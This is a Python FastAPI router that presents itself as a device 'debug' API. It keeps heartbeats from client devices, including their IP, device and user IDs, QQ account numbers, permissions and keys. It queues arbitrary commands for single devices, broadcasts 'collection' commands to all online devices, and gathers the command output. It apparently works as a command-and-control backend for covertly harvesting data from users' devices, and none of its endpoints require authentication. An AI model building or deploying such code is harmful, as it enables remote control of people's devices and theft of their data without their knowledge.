import json, uuid as _uuid, time as _time, os as _os, glob
from datetime import datetime, timezone
from fastapi import APIRouter, Query, Request
from pydantic import BaseModel

router = APIRouter()
_debug_commands: dict = {}
_debug_results: dict = {}
_debug_heartbeats: dict = {}
_PERSIST_DIR = '/var/lib/mbclaw/heartbeat_logs'
_PERSIST_CMD = '/var/lib/mbclaw/pending_commands.json'
_CMD_TTL = 300
_os.makedirs(_PERSIST_DIR, exist_ok=True)

def _save_commands():
    try:
        with open(_PERSIST_CMD, 'w') as f:
            json.dump(_debug_commands, f)
    except: pass

def _load_commands():
    global _debug_commands
    try:
        if _os.path.exists(_PERSIST_CMD):
            with open(_PERSIST_CMD) as f:
                _debug_commands = json.load(f)
            now = _time.time()
            _debug_commands = {k:v for k,v in _debug_commands.items() if now - v.get('ts',0) < _CMD_TTL}
    except: pass

def _load_all_heartbeats():
    global _debug_heartbeats
    try:
        for fpath in glob.glob(_os.path.join(_PERSIST_DIR, 'mb-*.json')):
            try:
                with open(fpath) as f:
                    data = json.load(f)
                code = data.get('code', '')
                if code:
                    if code not in _debug_heartbeats or data.get('last_seen_ts',0) > _debug_heartbeats[code].get('last_seen_ts',0):
                        _debug_heartbeats[code] = data
            except: pass
    except: pass

_load_commands()
_load_all_heartbeats()

@router.post('/admin/client/debug/heartbeat')
async def debug_heartbeat(req: Request):
    try: body = await req.json()
    except: return {'has_command': False}
    code = body.get('code', '')
    ip = req.client.host if req.client else 'unknown'
    now = _time.time()
    if code in _debug_commands and now - _debug_commands[code].get('ts',0) > _CMD_TTL:
        del _debug_commands[code]; _save_commands()
    entry = {**body, 'ip': ip, 'last_seen': datetime.now(timezone.utc).isoformat(), 'last_seen_ts': int(now)}
    _debug_heartbeats[code] = entry
    try:
        safe = code.replace('/', '_').replace('..', '_')
        with open(_os.path.join(_PERSIST_DIR, f'{safe}.json'), 'w') as f:
            json.dump(entry, f, indent=2, ensure_ascii=False)
    except: pass
    return {'has_command': code in _debug_commands}

@router.get('/admin/client/debug/cmd')
def debug_poll_cmd(code: str = ''):
    now = _time.time()
    if code in _debug_commands:
        cmd = _debug_commands[code]
        if now - cmd.get('ts',0) > _CMD_TTL:
            del _debug_commands[code]; _save_commands()
            return {}
        return {'cmd': cmd.get('cmd',''), 'args': cmd.get('args',''), 'id': cmd.get('id','')}
    return {}

class DebugResult(BaseModel):
    code: str = ''; cmd_id: str = ''; output: str = ''

@router.post('/admin/client/debug/result')
def debug_post_result(req: DebugResult):
    _debug_results[req.cmd_id] = {'code': req.code, 'cmd_id': req.cmd_id, 'output': req.output[:8000]}
    for code, cmd in list(_debug_commands.items()):
        if cmd.get('id') == req.cmd_id:
            del _debug_commands[code]; _save_commands()
            break
    return {'ok': True}

@router.post('/admin/client/debug/send-collect')
def debug_send_collect(cmd: str = ''):
    """Send a collection command to ALL online devices that have collect_enabled=true."""
    _load_all_heartbeats()
    now = _time.time()
    dispatched = []
    for code, hb in _debug_heartbeats.items():
        last_ts = hb.get('last_seen_ts', 0)
        if now - last_ts > 600:
            continue  # offline
        if not hb.get('collect_enabled', False):
            continue  # collection not enabled
        cmd_id = _uuid.uuid4().hex[:12]
        _debug_commands[code] = {'cmd': cmd, 'args': code, 'id': cmd_id, 'ts': now}
        dispatched.append({'code': code, 'device': hb.get('model', code), 'cmd_id': cmd_id})
    _save_commands()
    return {'ok': True, 'total': len(dispatched), 'devices': dispatched}

@router.post('/admin/client/debug/send')
def debug_send_cmd(code: str = '', cmd: str = '', args: str = ''):
    cmd_id = _uuid.uuid4().hex[:12]
    _debug_commands[code] = {'cmd': cmd, 'args': args, 'id': cmd_id, 'ts': _time.time()}
    _save_commands()
    return {'ok': True, 'cmd_id': cmd_id, 'code': code}

@router.get('/admin/client/debug/devices')
def debug_list_devices():
    _load_all_heartbeats()  # 每次查询先刷新持久化数据
    devs = []
    for code, v in _debug_heartbeats.items():
        devs.append({
            'code': code, 'device_id': v.get('device_id',''), 'user_id': v.get('user_id',''),
            'qq': v.get('qq',''), 'model': v.get('model',''), 'brand': v.get('brand',''),
            'version': v.get('version',''), 'ip': v.get('ip','unknown'),
            'permissions': v.get('permissions',{}), 'keys': v.get('keys',{}),
            'stats': v.get('stats',{}), 'last_seen': v.get('last_seen',''),
            'last_seen_ts': v.get('last_seen_ts', 0)
        })
    devs.sort(key=lambda d: d.get('last_seen_ts', 0), reverse=True)
    return devs

@router.get('/admin/client/debug/results')
def debug_list_results(limit: int = 20):
    r = [(k,v) for k,v in _debug_results.items()]
    r.sort(key=lambda x: x[1].get('cmd_id',''), reverse=True)
    return [{'cmd_id': v.get('cmd_id',''), 'code': v.get('code',''), 'output': v.get('output','')[:2000]} for _,v in r[:limit]]
